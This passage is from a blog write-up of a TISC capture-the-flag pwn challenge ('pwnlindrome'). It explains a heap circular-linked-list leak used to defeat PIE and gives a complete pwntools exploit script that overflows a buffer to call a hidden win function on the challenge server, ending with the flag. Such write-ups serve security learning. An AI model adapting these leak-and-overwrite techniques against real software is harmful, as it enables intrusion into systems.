</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ifstream</span><span class=o>::</span><span class=nf>close</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>ifstream</span><span class=o>::~</span><span class=nf>ifstream</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>__cxx11</span><span class=o>::</span><span class=n>basic_string</span><span class=o>&lt;</span><span class=kt>char</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>char_traits</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=p>,</span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;&gt;::~</span><span class=nf>basic_string</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>If we could call this function, we may be able to get a flag :)</p><p>However, this binary has <strong>PIE</strong>, which means we do not know the address of this function whenever it runs. We need to find a way to leak an address. Let&rsquo;s look at level 2 now.</p><p>I will spare you most of the reversing details <em>(some hours of staring at GDB)</em>, but level 2 essentially features an implementation of a circular linked list in the heap.</p><p><em>something like this</em></p><p><img src=https://static.javatpoint.com/ds/images/circular-singly-linked-list.png alt=image></p><p>Every new node created will be a new entry on this linked-list, and it will contain 3 values.</p><pre tabindex=0><code>0. Size of node
1. Pointer to the contents of the node (in another chunk)
2. Pointer to the next node in linked list
</code></pre><p>All contents of every node is stored on a contiguous chunk in the heap, and is sorted by sizes.</p><p>For each size, there is a maximum number of node that can be added, to prevent heap overflow.</p><p>Hence the program keeps count of the number of nodes stored for each size group, and a pointer to this count is also stored in the same chunk as the buffer.</p><p>Hence, the exploit allocates 2 chunks in different size groups, and modified the smaller chunk to fill up all the null bytes up to the pointer, so that the pointer address can be leaked, allowing us to resolve PIE.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># coding: utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>call</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;option: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;seed: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;180&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;here? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;34&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;option: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;message: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=o>-</span><span class=mi>131032</span><span class=o>+</span><span class=mi>40</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>orig</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>win</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=n>orig</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=p>(</span><span class=n>byte</span> <span class=o>^</span> <span class=mh>0x22</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x22</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tmp</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tmp</span> <span class=o>+=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>        <span class=n>win</span> <span class=o>+=</span> <span class=n>tmp</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;little&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>64</span> <span class=o>+</span> <span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;option: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;do? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;buffer: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;100&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;node: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;CHUNK SIZE 100&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;do? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;buffer: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;20&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;node: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;CHUNK SIZE 20&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;do? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;buffer: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1296&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;node: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>1296</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;do? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;buffer!</span><span class=se>\n\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>lstrip</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span> <span class=s1>&#39;all&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># cleanup</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;do? &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg&#39;</span><span class=p>,</span> <span class=mi>64421</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./pwnlindrome.elf&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=n>leak</span><span class=p>()</span> <span class=o>-</span> <span class=mi>33824</span>
</span></span><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>+</span> <span class=mi>15936</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>win</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>call</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><code>TISC{ov3rFL0w_4T_1Ts_fIn3sT}</code></p></div></article><hr style=margin-top:40px;margin-bottom:40px><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//caprinux.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/caprinux target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://x.com/elma_ios target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 elma.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg></a><script src=https://blog.caprinux.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>